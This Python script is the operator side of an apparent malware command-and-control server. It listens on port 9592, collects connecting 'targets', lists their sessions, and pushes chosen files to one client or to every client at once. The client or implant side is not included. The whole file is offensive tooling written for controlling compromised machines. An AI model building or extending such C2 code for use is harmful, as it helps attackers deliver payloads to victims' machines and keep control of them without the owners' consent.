import socket
import os
import threading

IP = input('The ip of the host machine:-')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, 9592))
s.listen()
ips = []
clis = []
print('listening.........')


def con():
    while True:
        cli, ipp = s.accept()
        clis.append(cli)
        ips.append(ipp)
        print(f'\n connection from {ipp}!')


t = threading.Thread(target=con)
t.start()


def send(cli, file_name):
    while True:
        if file_name == "q" or file_name == "quit":
            cli.send(file_name.encode())
            break

        elif os.path.exists(file_name):
            cli.send(file_name.encode())
            file = open(file_name, 'rb')
            file_data = file.read()
            cli.send(file_data)
            file.close()
            break

        else:
            print('file does not exist')
            break


while True:
    commands = input('command and control center:-')

    if commands == 'connections':
        counter = 0
        for ip in ips:
            print(f' session {counter} -------{ip}')
            counter += 1

    elif commands == 'help':
        print('use the command (send_all) ---> to send a file to all clients\n'
              'use the command (connections) ---> to see how many connections you have\n'
              'use the command (send) ---> to send a file to a specific client\n'
              'use the command (quit) ---> quit\n')

    elif commands == 'send_all':
        filename = input("Enter the name of the file you want to send(press q to quit):-")
        x = len(clis)
        print(f'number of targets {x}')
        i = 0
        try:
            while i < x:
                tar_number = clis[i]
                print(f'command has been sent to target number {i} ')
                send(tar_number, filename)
                i += 1
        except:
            print('[-] Failed')

    elif commands == 'clear':
        os.system('clear')

    elif commands[:4] == 'send':
        filename = input("Enter the name of the file you want to send(press q to quit):-")
        num = int(input("id of the client(numbers only):-"))
        try:
            cli_num = clis[num]
            send(cli_num, filename)

        except IndexError:
            print(f'[-] no client under the id number {num} use the command clients to see the ip of the clint next to their id number')
            pass

    elif commands == 'quit':
        x = len(clis)
        print(f'number of clients {x}')
        i = 0
        while i < x:
            tar_number = clis[i]
            print(f'client  {i} has has shutdown')
            fn = 'q'
            send(tar_number, fn)
            i += 1
        t.isDaemon()
        quit()
    else:
        print(f'command {commands} not found')
        pass
